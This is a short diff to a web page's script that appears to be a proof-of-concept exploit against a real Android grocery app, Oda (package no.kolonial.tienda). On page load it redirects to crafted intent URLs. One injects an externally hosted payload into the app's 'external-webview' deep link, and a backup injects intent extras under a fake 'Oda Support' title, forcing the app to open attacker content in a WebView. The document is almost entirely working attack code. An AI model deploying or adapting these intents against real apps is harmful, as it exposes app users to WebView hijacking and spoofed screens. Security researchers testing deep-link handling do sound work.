@@ -1,7 +1,13 @@
 <script>
-   // Automatic redirect to trigger the app and inject the payload URL
+   // The goal is to hit the 'external-webview' deep link path directly 
+   // bypasses the standard HTTPS resolution and forces a WebView screen.
    var payloadUrl = "https://st-mudo.github.io/webview-poc/trigger_bridge.html";
-   var intent = "intent://oda.com/no-en/account/climate/#Intent;scheme=https;package=no.kolonial.tienda;S.PUSH_OPENED_URL=" + payloadUrl + ";end";
 
-   window.location.href = intent;
+   // Method A: Deep Link Path Injection
+   var intentA = "intent://external-webview?url=" + encodeURIComponent(payloadUrl) + "#Intent;scheme=kolonialno;package=no.kolonial.tienda;end";
+
+   // Method B: Intent Extra Injection (Backup)
+   var intentB = "intent:#Intent;action=android.intent.action.VIEW;package=no.kolonial.tienda;S.url=" + payloadUrl + ";S.title=Oda%20Support;end";
+
+   window.location.href = intentA;
 </script>
